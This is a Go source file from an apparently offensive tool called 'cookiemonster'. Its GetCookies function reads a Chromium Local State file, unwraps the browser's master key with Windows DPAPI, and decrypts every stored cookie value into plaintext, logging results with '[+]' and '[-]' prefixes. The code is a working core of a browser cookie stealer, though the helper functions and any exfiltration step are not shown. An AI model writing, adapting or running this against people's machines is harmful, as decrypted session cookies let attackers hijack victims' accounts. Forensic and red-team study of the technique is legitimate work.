package cookiemonster

import (
	"log"

	"github.com/yanard18/cookiemonster/internal/decryption"
)

func GetCookies(stateFile, cookiesFile string) ([]Cookie, error) {
	encryptedKey, err := ParseLocalState(stateFile)
	if err != nil {
		log.Printf("[-] Error parsing local state file: %v\n", err)
		return nil, err
	}

	key, err := decryption.DecryptDPAPI(encryptedKey)
	if err != nil {
		log.Printf("[-] Error decrypting DPAPI blob of local state encrypted key: %v\n", err)
		return nil, err
	}

	cookies, err := ParseCookies(cookiesFile)
	if err != nil {
		return nil, err
	}

	log.Printf("[+] Found %d cookies\n", len(cookies))

	var out []Cookie
	for _, cookie := range cookies {

		// Decrypt the cookie value
		decryptedCookieValue, err := decryption.DecryptEncryptedCookieValue([]byte(cookie.Value), key)
		if err != nil {
			log.Printf("[-] Error decrypting cookie value: %v\n", err)
			continue
		}

		// create cookie struct
		decryptedCookie := Cookie{
			Host:        cookie.Host,
			Name:        cookie.Name,
			Value:       decryptedCookieValue,
			Path:        cookie.Path,
			IsSecure:    cookie.IsSecure,
			IsHttpOnly:  cookie.IsHttpOnly,
			CreationUtc: cookie.CreationUtc,
			ExpiryUtc:   cookie.ExpiryUtc,
		}

		out = append(out, decryptedCookie)
	}

	return out, nil
}
